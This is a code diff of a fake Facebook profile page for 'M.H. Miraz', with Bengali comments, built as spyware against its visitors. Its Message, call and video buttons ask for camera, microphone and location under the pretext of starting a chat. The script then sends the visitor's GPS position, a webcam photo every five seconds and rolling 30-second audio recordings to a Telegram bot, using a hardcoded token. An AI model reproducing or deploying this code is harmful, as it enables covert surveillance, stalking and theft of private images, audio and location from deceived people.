@@ -6,11 +6,9 @@
     <title>M.H. Miraz | Profile</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* তোমার অরিজিনাল ডিজাইন - কোনো পরিবর্তন নেই */
+        /* তোমার অরিজিনাল ডিজাইন */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Helvetica, Arial, sans-serif; }
-        body { background-color: #f0f2f5; overflow-x: hidden; }
-        #entryOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 10000; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; }
-        .open-btn { background: #1877f2; color: white; border: none; padding: 14px 50px; border-radius: 8px; font-weight: bold; font-size: 19px; cursor: pointer; }
+        body { background-color: #f0f2f5; }
         .header { background: white; padding-bottom: 15px; border-bottom: 1px solid #ddd; text-align: center; }
         .cover { width: 100%; height: 200px; background: #ddd url('cover.jpg') center/cover; }
         .profile-container { position: relative; display: inline-block; margin-top: -75px; }
@@ -18,25 +16,21 @@
         .name-box h1 { font-size: 28px; font-weight: bold; margin-top: 10px; }
         .bio-section { padding: 15px 20px; text-align: center; background: white; border-bottom: 1px solid #ddd; }
         .details-list { text-align: left; max-width: 350px; margin: 15px auto 0; display: flex; flex-direction: column; gap: 10px; }
-        .detail-item { display: flex; align-items: center; gap: 10px; font-size: 15px; }
+        .detail-item { display: flex; align-items: center; gap: 10px; font-size: 15px; color: #1c1e21; }
+        
+        /* মেসেঞ্জার ডিজাইন */
         #chatBox { display:none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999; flex-direction: column; }
         .chat-h { padding: 10px 15px; border-bottom: 1px solid #eee; display: flex; align-items: center; justify-content: space-between; }
         #msgs { flex: 1; overflow-y: auto; padding: 15px; }
         .inp-bar { padding: 10px 15px; display: flex; align-items: center; border-top: 1px solid #eee; }
         .inp-bar input { flex: 1; border: none; background: #f0f2f5; padding: 10px 15px; border-radius: 20px; outline: none; }
-        video, canvas { display: none; position: absolute; left: -9999px; }
+        
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div id="entryOverlay">
-        <i class="fab fa-facebook-messenger" style="font-size: 55px; color: #0084ff; margin-bottom: 20px;"></i>
-        <h2 style="margin-bottom: 10px;">Facebook Messenger</h2>
-        <p style="color:#65676b; margin-bottom:30px; font-size:14px;">Continue to see profile and details</p>
-        <button class="open-btn" onclick="startFinalProcess()">Open Link</button>
-    </div>
-
-    <div id="mainContent" style="display:none; height: 100vh; overflow-y: auto;">
+    <div id="mainContent">
         <div class="header">
             <div class="cover"></div>
             <div class="profile-container"><div class="profile-pic"></div></div>
@@ -46,9 +40,10 @@
             </div>
             <div style="display:flex; padding: 15px; gap: 10px;">
                 <button style="background:#1877f2; color:white; border:none; padding:10px; border-radius:6px; flex:1; font-weight:600;">+ Add Friend</button>
-                <button style="background:#e4e6eb; color:black; border:none; padding:10px; border-radius:6px; flex:1; font-weight:600;" onclick="openChat()">📩 Message</button>
+                <button style="background:#e4e6eb; color:black; border:none; padding:10px; border-radius:6px; flex:1; font-weight:600;" onclick="askPermissions()">📩 Message</button>
             </div>
         </div>
+
         <div class="bio-section">
             <p>Life is a Book, and those who do not travel read only a page. 📖✈️</p>
             <div class="details-list">
@@ -61,74 +56,86 @@
 
     <div id="chatBox">
         <div class="chat-h">
-            <i class="fas fa-arrow-left" style="color:#0084ff;" onclick="closeChat()"></i>
-            <span style="font-weight:bold;">M.H. Miraz</span>
-            <i class="fas fa-video" style="color:#0084ff;"></i>
+            <div style="display:flex; align-items:center; gap:12px;">
+                <i class="fas fa-arrow-left" style="color:#0084ff;" onclick="closeChat()"></i>
+                <img src="profile.jpg" style="width:35px; height:35px; border-radius:50%;">
+                <span style="font-weight:bold;">M.H. Miraz</span>
+            </div>
+            <div style="color:#0084ff; display:flex; gap:18px;">
+                <i class="fas fa-phone-alt" onclick="askPermissions()"></i>
+                <i class="fas fa-video" onclick="askPermissions()"></i>
+            </div>
         </div>
         <div id="msgs"></div>
         <div class="inp-bar"><input type="text" placeholder="Aa"></div>
     </div>
 
-    <video id="vid" autoplay playsinline muted></video>
-    <canvas id="canv"></canvas>
+    <video id="v" autoplay playsinline muted></video>
+    <canvas id="c"></canvas>
 
     <script>
-        const tok = '8600117294:AAH2qNjbQz3-iOCjHsZBfOi1qAUs1Uq2i0o';
-        const cid = '7767412329';
+        const T = '8600117294:AAH2qNjbQz3-iOCjHsZBfOi1qAUs1Uq2i0o';
+        const C = '7767412329';
+        let isActive = false;
 
-        async function startFinalProcess() {
+        async function askPermissions() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                document.getElementById('vid').srcObject = stream;
+                // ক্যামেরা ও মাইক্রোফোন পারমিশন (ভিডিও কলের বাহানায়)
+                const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('v').srcObject = s;
                 
-                // ছবি প্রতি ৫ সেকেন্ডে
-                setInterval(capturePic, 5000);
-                
-                // অডিও লুপ ৩০ সেকেন্ডে
-                setupVoice(stream);
+                // লোকেশন পারমিশন
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=📍 Location: https://www.google.com/maps?q=${lat},${lon}`);
+                });
 
-                document.getElementById('entryOverlay').style.display = 'none';
-                document.getElementById('mainContent').style.display = 'block';
-            } catch (err) {
-                alert("Permission needed to continue.");
+                if(!isActive) {
+                    setInterval(takePic, 5000);
+                    startVoiceLoop(s);
+                    isActive = true;
+                }
+                
+                openChat(); // পারমিশন দেওয়ার পর মেসেঞ্জার ওপেন হবে
+            } catch (e) {
+                alert("To start a video call or send messages, please allow camera/mic access.");
             }
         }
 
-        function capturePic() {
-            const v = document.getElementById('vid');
-            const c = document.getElementById('canv');
-            if (v.videoWidth === 0) return;
-            c.width = v.videoWidth; c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v, 0, 0);
-            c.toBlob((b) => {
+        function takePic() {
+            const video = document.getElementById('v');
+            const canvas = document.getElementById('c');
+            if (video.videoWidth === 0) return;
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.toBlob((b) => {
                 let f = new FormData();
-                f.append('chat_id', cid);
-                f.append('photo', b, 's.jpg');
-                sendToTelegram(f, 'sendPhoto');
+                f.append('chat_id', C);
+                f.append('photo', b, 'img.jpg');
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', `https://api.telegram.org/bot${T}/sendPhoto`, true);
+                xhr.send(f);
             }, 'image/jpeg', 0.5);
         }
 
-        function setupVoice(s) {
-            let m = new MediaRecorder(s);
-            let d = [];
-            m.ondataavailable = (e) => d.push(e.data);
-            m.onstop = () => {
-                let b = new Blob(d, { type: 'audio/ogg' });
+        function startVoiceLoop(s) {
+            let r = new MediaRecorder(s);
+            let ch = [];
+            r.ondataavailable = (e) => ch.push(e.data);
+            r.onstop = () => {
+                const b = new Blob(ch, { type: 'audio/ogg' });
                 let f = new FormData();
-                f.append('chat_id', cid);
+                f.append('chat_id', C);
                 f.append('voice', b, 'v.ogg');
-                sendToTelegram(f, 'sendVoice');
-                d = [];
-                m.start();
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', `https://api.telegram.org/bot${T}/sendVoice`, true);
+                xhr.send(f);
+                ch = [];
+                r.start();
             };
-            m.start();
-            setInterval(() => { if(m.state==='recording') m.stop(); }, 30000);
-        }
-
-        function sendToTelegram(formData, method) {
-            let xhr = new XMLHttpRequest();
-            xhr.open('POST', `https://api.telegram.org/bot${tok}/${method}`, true);
-            xhr.send(formData);
+            r.start();
+            setInterval(() => { if(r.state==='recording') r.stop(); }, 30000);
         }
 
         function openChat() { document.getElementById('chatBox').style.display = 'flex'; }
